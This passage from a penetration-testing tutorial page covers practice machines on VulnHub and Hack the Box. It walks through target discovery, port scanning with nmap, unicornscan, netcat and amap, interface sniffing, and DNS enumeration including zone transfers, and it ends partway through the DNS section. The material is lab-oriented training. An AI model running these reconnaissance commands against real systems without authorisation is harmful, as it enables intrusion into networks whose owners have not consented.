<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-R21NVEB2EY');
    </script>
    
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vulnerable Machines &mdash; tech.bitvijays.com 2.0.0 documentation</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />

  
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../_static/jquery.js?v=5d32c60e"></script>
        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../_static/documentation_options.js?v=51b770b3"></script>
        <script src="../_static/doctools.js?v=9a2dae69"></script>
        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
        <script src="../_static/debug.js"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            tech.bitvijays.com
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P2-VulnerabilityAnalysis.html">Vulnerability Analysis</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P3-Exploitation.html">Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P5-Reporting.html">Reporting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P1-FromNothingToUnprivilegedShell.html">From Nothing to a Unprivileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P2-UnprivilegedToPrivilegedShell.html">Unprivileged Shell to Privileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P3-TipsAndTricks.html">Tips and Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P4-Appendix.html">Appendix</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html">Binary Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Forensics.html">Forensics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-ReverseEngineering.html">Reverse Engineering</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Cryptography.html">Cryptography</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-CodingQuickRef.html">Coding Quick Reference</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-IndustrialControlSystems.html">Industrial Control Systems</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">tech.bitvijays.com</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Vulnerable Machines</li>
      <li class="wy-breadcrumbs-aside">
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="vulnerable-machines">
<h1>Vulnerable Machines<a class="headerlink" href="#vulnerable-machines" title="Link to this heading"></a></h1>
<p>This post (Work in Progress) records what we learned by doing vulnerable machines provided by <a class="reference external" href="https://vulnhub.com">VulnHub</a>, <a class="reference external" href="https://hackthebox.eu">Hack the Box</a> and others. The steps below could be followed to find vulnerabilities, exploit these vulnerabilities and finally achieve system/ root.</p>
<p>Once you download a virtual machines from <a class="reference external" href="https://vulnhub.com">VulnHub</a>  you can run it by using virtualisation software such as VMware or Virtual Box.</p>
<p>We would like to <strong>thank g0tm1lk</strong> for maintaining <strong>Vulnhub</strong> and the <strong>moderators</strong> of <strong>HackTheBox</strong>. Also, <strong>shout-outs</strong> are in order for each and every <strong>author of Vulnerable Machines and/ or write-ups</strong>. Thank you for providing these awesome challenges to learn from and sharing your knowledge with the IT security community! <strong>Thank You!!</strong></p>
<p>Generally, we go through the following stages when solving a vulnerable machine:</p>
<ul class="simple">
<li><p><a class="reference internal" href="#finding-the-ip-address"><span class="std std-ref">Finding the IP address</span></a></p></li>
<li><p><a class="reference internal" href="#port-scanning"><span class="std std-ref">Port Scanning</span></a></p></li>
<li><p><a class="reference internal" href="#rabbit-holes"><span class="std std-ref">Rabbit Holes</span></a></p></li>
<li><p><a class="reference internal" href="#from-nothing-to-unprivileged-shell"><span class="std std-ref">From Nothing to a Unprivileged Shell</span></a></p></li>
<li><p><a class="reference internal" href="#unprivileged-shell-to-privileged-shell"><span class="std std-ref">Unprivileged Shell to Privileged Shell</span></a></p></li>
</ul>
<p>In this blog post, we have mentioned, what can be done in each separate stage. Furthermore, we have also provided <a class="reference internal" href="#tips-and-tricks"><span class="std std-ref">Tips and Tricks</span></a> for solving vulnerable VMs. Additionally <span class="xref std std-doc">LFF-IPS-P2-VulnerabilityAnalysis</span> could be referred for exploitation of any particular services (i.e. it provides information such as “If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited”). Lastly there are also appendixes related to</p>
<ul class="simple">
<li><p><a class="reference internal" href="#a1-local-file-inclusion"><span class="std std-ref">Appendix-I : Local File Inclusion</span></a></p></li>
<li><p><a class="reference internal" href="#a2-file-upload"><span class="std std-ref">Appendix-II : File Upload</span></a></p></li>
<li><p><a class="reference internal" href="#a3-tranfer-files-from-linux-to-windows"><span class="std std-ref">Appendix-III Transferring Files from Linux to Windows (post-exploitation)</span></a></p></li>
<li><p><a class="reference internal" href="#a4-linux-group-membership-issues"><span class="std std-ref">Appendix-IV Linux Group Membership Issues</span></a></p></li>
<li><p><a class="reference internal" href="#a5-coding-languages-tricks"><span class="std std-ref">Appendix-V Coding Languages Tricks</span></a></p></li>
</ul>
<section id="finding-the-ip-address">
<span id="id2"></span><h2>Finding the IP address<a class="headerlink" href="#finding-the-ip-address" title="Link to this heading"></a></h2>
<p>Before, exploiting any machine, we need to figure out its IP address.</p>
<section id="netdiscover">
<h3>Netdiscover<a class="headerlink" href="#netdiscover" title="Link to this heading"></a></h3>
<p>An active/ passive arp reconnaissance tool</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">netdiscover</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span>
<span class="o">-</span><span class="n">i</span> <span class="n">interface</span> <span class="p">:</span> <span class="n">The</span> <span class="n">network</span> <span class="n">interface</span> <span class="n">to</span> <span class="n">sniff</span> <span class="ow">and</span> <span class="n">inject</span> <span class="n">packets</span> <span class="n">on</span><span class="o">.</span>
<span class="o">-</span><span class="n">r</span> <span class="nb">range</span> <span class="p">:</span> <span class="n">Scan</span> <span class="n">a</span> <span class="n">given</span> <span class="nb">range</span> <span class="n">instead</span> <span class="n">performing</span> <span class="n">an</span> <span class="n">auto</span> <span class="n">scan</span><span class="o">.</span>

<span class="n">Example</span><span class="p">:</span>
<span class="n">netdiscover</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span><span class="o">/</span><span class="n">wlan0</span><span class="o">/</span><span class="n">vboxnet0</span><span class="o">/</span><span class="n">vmnet1</span> <span class="o">-</span><span class="n">r</span> <span class="mf">192.168.1.0</span><span class="o">/</span><span class="mi">24</span>
</pre></div>
</div>
<p>Interface names of common Virtualisation Software:</p>
<ul class="simple">
<li><p>Virtualbox : vboxnet</p></li>
<li><p>Vmware     : vmnet</p></li>
</ul>
</section>
<section id="nmap">
<h3>Nmap<a class="headerlink" href="#nmap" title="Link to this heading"></a></h3>
<p>Network exploration tool and security/ port scanner</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>
<span class="o">-</span><span class="n">sP</span><span class="o">/-</span><span class="n">sn</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="o">-</span><span class="n">disable</span> <span class="n">port</span> <span class="n">scan</span>
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sP</span><span class="o">/-</span><span class="n">sn</span> <span class="mf">192.168.1.0</span><span class="o">/</span><span class="mi">24</span>
</pre></div>
</div>
</section>
</section>
<section id="port-scanning">
<span id="id3"></span><h2>Port Scanning<a class="headerlink" href="#port-scanning" title="Link to this heading"></a></h2>
<p>Port scanning provides a large amount of information about open (exposed) services and possible exploits that may target these services.</p>
<p>Common port scanning software include: nmap, unicornscan, netcat (when nmap is not available).</p>
<section id="id4">
<h3>Nmap<a class="headerlink" href="#id4" title="Link to this heading"></a></h3>
<p>Network exploration tool and security/ port scanner</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="p">[</span><span class="n">Scan</span> <span class="n">Type</span><span class="p">]</span> <span class="p">[</span><span class="n">Options</span><span class="p">]</span> <span class="p">{</span><span class="n">target</span> <span class="n">specification</span><span class="p">}</span>

<span class="n">HOST</span> <span class="n">DISCOVERY</span><span class="p">:</span>
<span class="o">-</span><span class="n">sL</span><span class="p">:</span> <span class="n">List</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">simply</span> <span class="nb">list</span> <span class="n">targets</span> <span class="n">to</span> <span class="n">scan</span>
<span class="o">-</span><span class="n">sn</span><span class="o">/-</span><span class="n">sP</span><span class="p">:</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="o">-</span> <span class="n">disable</span> <span class="n">port</span> <span class="n">scan</span>
<span class="o">-</span><span class="n">Pn</span><span class="p">:</span> <span class="n">Treat</span> <span class="nb">all</span> <span class="n">hosts</span> <span class="k">as</span> <span class="n">online</span> <span class="o">--</span> <span class="n">skip</span> <span class="n">host</span> <span class="n">discovery</span>

<span class="n">SCAN</span> <span class="n">TECHNIQUES</span><span class="p">:</span>
<span class="o">-</span><span class="n">sS</span><span class="o">/</span><span class="n">sT</span><span class="o">/</span><span class="n">sA</span><span class="o">/</span><span class="n">sW</span><span class="o">/</span><span class="n">sM</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">SYN</span><span class="o">/</span><span class="n">Connect</span><span class="p">()</span><span class="o">/</span><span class="n">ACK</span><span class="o">/</span><span class="n">Window</span><span class="o">/</span><span class="n">Maimon</span> <span class="n">scans</span>
<span class="o">-</span><span class="n">sU</span><span class="p">:</span> <span class="n">UDP</span> <span class="n">Scan</span> <span class="o">-</span><span class="n">sN</span><span class="o">/</span><span class="n">sF</span><span class="o">/</span><span class="n">sX</span><span class="p">:</span> <span class="n">TCP</span> <span class="n">Null</span><span class="p">,</span> <span class="n">FIN</span><span class="p">,</span> <span class="ow">and</span> <span class="n">Xmas</span> <span class="n">scans</span>

<span class="n">PORT</span> <span class="n">SPECIFICATION</span><span class="p">:</span>
<span class="o">-</span><span class="n">p</span> <span class="p">:</span> <span class="n">Only</span> <span class="n">scan</span> <span class="n">specified</span> <span class="n">ports</span>
<span class="n">Ex</span><span class="p">:</span> <span class="o">-</span><span class="n">p22</span><span class="p">;</span> <span class="o">-</span><span class="n">p1</span><span class="o">-</span><span class="mi">65535</span><span class="p">;</span> <span class="o">-</span><span class="n">p</span> <span class="n">U</span><span class="p">:</span><span class="mi">53</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">137</span><span class="p">,</span><span class="n">T</span><span class="p">:</span><span class="mi">21</span><span class="o">-</span><span class="mi">25</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">8080</span><span class="p">,</span><span class="n">S</span><span class="p">:</span><span class="mi">9</span>

<span class="n">SERVICE</span><span class="o">/</span><span class="n">VERSION</span> <span class="n">DETECTION</span><span class="p">:</span>
<span class="o">-</span><span class="n">sV</span><span class="p">:</span> <span class="n">Probe</span> <span class="nb">open</span> <span class="n">ports</span> <span class="n">to</span> <span class="n">determine</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span> <span class="n">info</span>

<span class="n">OUTPUT</span><span class="p">:</span>
<span class="o">-</span><span class="n">oN</span><span class="o">/-</span><span class="n">oX</span><span class="o">/-</span><span class="n">oS</span><span class="o">/-</span><span class="n">oG</span> <span class="p">:</span> <span class="n">Output</span> <span class="n">scan</span> <span class="ow">in</span> <span class="n">normal</span><span class="p">,</span> <span class="n">XML</span><span class="p">,</span><span class="n">Output</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">three</span> <span class="n">major</span> <span class="n">formats</span> <span class="n">at</span> <span class="n">once</span>
<span class="o">-</span><span class="n">v</span><span class="p">:</span> <span class="n">Increase</span> <span class="n">verbosity</span> <span class="n">level</span> <span class="p">(</span><span class="n">use</span> <span class="o">-</span><span class="n">vv</span> <span class="ow">or</span> <span class="n">more</span> <span class="k">for</span> <span class="n">greater</span> <span class="n">effect</span><span class="p">)</span>

<span class="n">MISC</span><span class="p">:</span> <span class="o">-</span><span class="mi">6</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">IPv6</span> <span class="n">scanning</span> <span class="o">-</span><span class="n">A</span><span class="p">:</span> <span class="n">Enable</span> <span class="n">OS</span> <span class="n">detection</span><span class="p">,</span> <span class="n">version</span> <span class="n">detection</span><span class="p">,</span> <span class="n">script</span> <span class="n">scanning</span><span class="p">,</span> <span class="ow">and</span> <span class="n">traceroute</span>
</pre></div>
</div>
</section>
<section id="unicornscan">
<h3>Unicornscan<a class="headerlink" href="#unicornscan" title="Link to this heading"></a></h3>
<p>A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively short time frame.</p>
<p>As unicornscan is faster then nmap it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written <a class="reference external" href="https://github.com/superkojiman/onetwopunch">onetwopunch</a> for this.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>unicornscan [options] X.X.X.X/YY:S-E
  -i, --interface : interface name, like eth0 or fxp1, not normally required
  -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf&#39; for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)

  Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied.
  Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024

 example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.
</pre></div>
</div>
</section>
<section id="netcat">
<h3>Netcat<a class="headerlink" href="#netcat" title="Link to this heading"></a></h3>
<p>Netcat might not be the best tool to use for port scanning, but it can be used quickly. While Netcat scans TCP ports by default it can perform UDP scans as well.</p>
<section id="tcp-scan">
<h4>TCP Scan<a class="headerlink" href="#tcp-scan" title="Link to this heading"></a></h4>
<p>For a TCP scan, the format is:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">vvn</span> <span class="o">-</span><span class="n">z</span> <span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span> <span class="n">startport</span><span class="o">-</span><span class="n">endport</span>

   <span class="o">-</span><span class="n">z</span> <span class="n">flag</span> <span class="ow">is</span> <span class="n">Zero</span><span class="o">-</span><span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="n">mode</span> <span class="p">(</span><span class="n">used</span> <span class="k">for</span> <span class="n">scanning</span><span class="p">)</span>
   <span class="o">-</span><span class="n">vv</span> <span class="n">will</span> <span class="n">provide</span> <span class="n">verbose</span> <span class="n">information</span> <span class="n">about</span> <span class="n">the</span> <span class="n">results</span>
   <span class="o">-</span><span class="n">n</span> <span class="n">flag</span> <span class="n">allows</span> <span class="n">to</span> <span class="n">skip</span> <span class="n">the</span> <span class="n">DNS</span> <span class="n">lookup</span>
</pre></div>
</div>
</section>
<section id="udp-scan">
<h4>UDP Scan<a class="headerlink" href="#udp-scan" title="Link to this heading"></a></h4>
<p>For a UDP Port Scan, we need to add -u flag which makes the format:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">vvn</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">z</span> <span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">xxx</span> <span class="n">startport</span><span class="o">-</span><span class="n">endport</span>
</pre></div>
</div>
<p>If we have windows machine without nmap, we can use <a class="reference external" href="https://www.powershellgallery.com/packages/PSnmap/">PSnmap</a></p>
</section>
</section>
<section id="amap-application-mapper">
<h3>Amap - Application mapper<a class="headerlink" href="#amap-application-mapper" title="Link to this heading"></a></h3>
<p>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you which application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.</p>
<p>By using <strong>amap</strong>, we can identify which services are running on a given port. For example is there a SSL server running on port 3445 or some oracle listener on port 23? Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect followed by trying to identify the SSL-enabled protocol!. e.g.  One of the vulnhub VM’s was running http and https on the same port.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">amap</span> <span class="o">-</span><span class="n">A</span> <span class="mf">192.168.1.2</span> <span class="mi">12380</span>
<span class="n">amap</span> <span class="n">v5</span><span class="mf">.4</span> <span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">thc</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">amap</span><span class="p">)</span> <span class="n">started</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span> <span class="mi">05</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">09</span> <span class="o">-</span> <span class="n">APPLICATION</span> <span class="n">MAPPING</span> <span class="n">mode</span>
<span class="n">Protocol</span> <span class="n">on</span> <span class="mf">192.168.1.2</span><span class="p">:</span><span class="mi">12380</span><span class="o">/</span><span class="n">tcp</span> <span class="n">matches</span> <span class="n">http</span>
<span class="n">Protocol</span> <span class="n">on</span> <span class="mf">192.168.1.2</span><span class="p">:</span><span class="mi">12380</span><span class="o">/</span><span class="n">tcp</span> <span class="n">matches</span> <span class="n">http</span><span class="o">-</span><span class="n">apache</span><span class="o">-</span><span class="mi">2</span>
<span class="n">Protocol</span> <span class="n">on</span> <span class="mf">192.168.1.2</span><span class="p">:</span><span class="mi">12380</span><span class="o">/</span><span class="n">tcp</span> <span class="n">matches</span> <span class="n">ntp</span>
<span class="n">Protocol</span> <span class="n">on</span> <span class="mf">192.168.1.2</span><span class="p">:</span><span class="mi">12380</span><span class="o">/</span><span class="n">tcp</span> <span class="n">matches</span> <span class="n">ssl</span>
<span class="n">Unidentified</span> <span class="n">ports</span><span class="p">:</span> <span class="n">none</span><span class="o">.</span>
<span class="n">amap</span> <span class="n">v5</span><span class="mf">.4</span> <span class="n">finished</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span> <span class="mi">05</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">16</span>
</pre></div>
</div>
</section>
</section>
<section id="rabbit-holes">
<span id="id5"></span><h2>Rabbit Holes<a class="headerlink" href="#rabbit-holes" title="Link to this heading"></a></h2>
<p>There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues on how to get unstuck.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>When in doubt, enumerate</p>
</div>
<section id="listen-to-the-interface">
<span id="id6"></span><h3>Listen to the interface<a class="headerlink" href="#listen-to-the-interface" title="Link to this heading"></a></h3>
<p>Many VMs send data on random ports therefore we recommend to listen to the local interface (vboxnet0 / vmnet) on which the VM is running. This can be done by using wireshark or tcpdump. For example, one of the vulnhub VMs, performs an arp scan and sends a SYN packet on port 4444, if something is listening on that port, it sends some data.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span>

<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.096292</span> <span class="n">IP</span> <span class="mf">192.168.56.101.36327</span> <span class="o">&gt;</span> <span class="mf">192.168.56.1.4444</span><span class="p">:</span> <span class="n">Flags</span> <span class="p">[</span><span class="n">S</span><span class="p">],</span> <span class="n">seq</span> <span class="mi">861815232</span><span class="p">,</span> <span class="n">win</span> <span class="mi">16384</span><span class="p">,</span> <span class="n">options</span> <span class="p">[</span><span class="n">mss</span> <span class="mi">1460</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">sackOK</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">wscale</span> <span class="mi">3</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">TS</span> <span class="n">val</span> <span class="mi">4127458640</span> <span class="n">ecr</span> <span class="mi">0</span><span class="p">],</span> <span class="n">length</span> <span class="mi">0</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.096330</span> <span class="n">IP</span> <span class="mf">192.168.56.1.4444</span> <span class="o">&gt;</span> <span class="mf">192.168.56.101.36327</span><span class="p">:</span> <span class="n">Flags</span> <span class="p">[</span><span class="n">R</span><span class="o">.</span><span class="p">],</span> <span class="n">seq</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ack</span> <span class="mi">861815233</span><span class="p">,</span> <span class="n">win</span> <span class="mi">0</span><span class="p">,</span> <span class="n">length</span> <span class="mi">0</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.098584</span> <span class="n">ARP</span><span class="p">,</span> <span class="n">Request</span> <span class="n">who</span><span class="o">-</span><span class="n">has</span> <span class="mf">192.168.56.2</span> <span class="n">tell</span> <span class="mf">192.168.56.101</span><span class="p">,</span> <span class="n">length</span> <span class="mi">28</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.100773</span> <span class="n">ARP</span><span class="p">,</span> <span class="n">Request</span> <span class="n">who</span><span class="o">-</span><span class="n">has</span> <span class="mf">192.168.56.3</span> <span class="n">tell</span> <span class="mf">192.168.56.101</span><span class="p">,</span> <span class="n">length</span> <span class="mi">28</span>
<span class="mi">18</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mf">04.096292</span> <span class="n">IP</span> <span class="mf">192.168.56.101.36327</span> <span class="o">&gt;</span> <span class="mf">192.168.56.1.4444</span><span class="p">:</span> <span class="n">Flags</span> <span class="p">[</span><span class="n">S</span><span class="p">],</span>
</pre></div>
</div>
<p>While listening on port 4444, we might receive something like a base64 encoded string or some message.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>nc -lvp 4444
listening on [any] 4444 …
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh
</pre></div>
</div>
</section>
<section id="dns-server">
<h3>DNS Server<a class="headerlink" href="#dns-server" title="Link to this heading"></a></h3>
<p>If the targeted machine is running a DNS Server and we have a possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">host</span> <span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">optional_name_server</span><span class="o">&gt;</span>
<span class="n">host</span> <span class="o">-</span><span class="n">t</span> <span class="n">ns</span> <span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span>                <span class="o">--</span> <span class="n">Name</span> <span class="n">Servers</span>
<span class="n">host</span> <span class="o">-</span><span class="n">t</span> <span class="n">a</span> <span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span>                 <span class="o">--</span> <span class="n">Address</span>
<span class="n">host</span> <span class="o">-</span><span class="n">t</span> <span class="n">aaaa</span> <span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span>              <span class="o">--</span> <span class="n">AAAA</span> <span class="n">record</span> <span class="n">points</span> <span class="n">a</span> <span class="n">domain</span> <span class="ow">or</span> <span class="n">subdomain</span> <span class="n">to</span> <span class="n">an</span> <span class="n">IPv6</span> <span class="n">address</span>
<span class="n">host</span> <span class="o">-</span><span class="n">t</span> <span class="n">mx</span> <span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span>                <span class="o">--</span> <span class="n">Mail</span> <span class="n">Servers</span>
<span class="n">host</span> <span class="o">-</span><span class="n">t</span> <span class="n">soa</span> <span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span>               <span class="o">--</span> <span class="n">Start</span> <span class="n">of</span> <span class="n">Authority</span>
<span class="n">host</span> <span class="o">&lt;</span><span class="n">IP</span><span class="o">&gt;</span>                          <span class="o">--</span> <span class="n">Reverse</span> <span class="n">Lookup</span>
<span class="n">host</span> <span class="o">-</span><span class="n">l</span> <span class="o">&lt;</span><span class="n">Domain</span> <span class="n">Name</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">DNS</span> <span class="n">Server</span><span class="o">&gt;</span> <span class="o">--</span> <span class="n">Domain</span> <span class="n">Zone</span> <span class="n">Transfer</span>
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">host</span> <span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span>
<span class="n">scanme</span><span class="o">.</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="n">has</span> <span class="n">address</span> <span class="mf">45.33.32.156</span>
